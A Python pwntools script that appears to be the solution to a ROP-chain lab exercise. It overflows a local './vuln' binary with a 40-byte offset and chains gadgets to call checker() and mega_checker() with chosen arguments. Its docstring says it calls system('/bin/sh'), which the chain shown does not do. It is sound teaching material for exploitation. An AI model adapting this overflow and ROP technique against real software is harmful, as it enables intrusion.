#!/usr/bin/env python

"""
Solution (exploit) for rop-chain task.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

io = process("./vuln")

# TODO: Fill required addresses.
offset = 40
pop_rdi_ret_address = 0x0000000000400743 # ROPgadget --binary ./vuln | egrep rdi 
value1 = 0x11223344
checker_address = 0x0000000040065f # objdump -t ./vuln | egrep check

value2_1 = 0x88776655
value2_2 = 0xaabbccdd

mega_checker_address = 0x0400632 # objdump -t ./vuln | egrep check

# TODO: Discover and fill address of gadget to initialize rsi.
rsi_gadget = 0x0000000000400741 # ROPgadget --binary ./vuln | egrep rsi
main_ret_addr = 0x00000000004006da # from gdb, graceful exit

# TODO: Update payload to call mega_checker() after calling checker().
payload = 40 * b'A' + p64(pop_rdi_ret_address) + p64(value1) + p64(checker_address) + p64(pop_rdi_ret_address) + p64(value2_1) + p64(rsi_gadget) + p64(value2_2) + p64(mega_checker_address) + p64(mega_checker_address) + p64(main_ret_addr)

file_path = 'input'

# Write the payload to the file
with open(file_path, 'wb') as file:
    file.write(payload)

print(f"ROP payload has been written to {file_path}")

msg = io.recvuntil(': ')
io.sendline(payload)

io.interactive()
